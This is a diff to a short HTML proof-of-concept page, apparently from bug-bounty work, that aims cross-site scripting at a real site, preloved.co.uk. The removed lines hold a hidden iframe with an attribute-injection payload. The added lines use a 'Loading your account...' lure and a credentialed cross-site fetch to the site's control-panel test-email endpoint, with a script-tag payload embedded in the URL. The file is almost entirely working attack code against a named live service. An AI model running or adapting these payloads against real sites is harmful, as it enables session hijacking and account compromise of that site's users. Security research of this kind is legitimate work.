@@ -1,5 +1,30 @@
+<!DOCTYPE html>
 <html>
+<head>
+<title>Preloved XSS Poc</title>
+</head>
 <body>
-<iframe src="https://www.preloved.co.uk/classifieds/furniture-fittings/all/uk/'accesskey='x'onclick='alert(/../)" style="display:none;"></iframe>
+<h2>Loading your account...</h2>
+
+<script>
+// CSRF to trigger the XSS
+fetch('https://www.preloved.co.uk/controlpanel/testemail?p8t7i8=1--><script>alert(document.domain)</script>', {
+    method: 'GET',
+    headers: {
+        'X-Middleton': '1asd213'
+    },
+    credentials: 'include'  // Send cookies
+})
+.then(response => response.text())
+.then(data => {
+    // The XSS should execute automatically
+    document.getElementById('result').innerHTML = "XSS triggered!";
+})
+.catch(err => {
+    document.getElementById('result').innerHTML = "Error: " + err;
+});
+</script>
+
+<div id="result"></div>
 </body>
 </html>
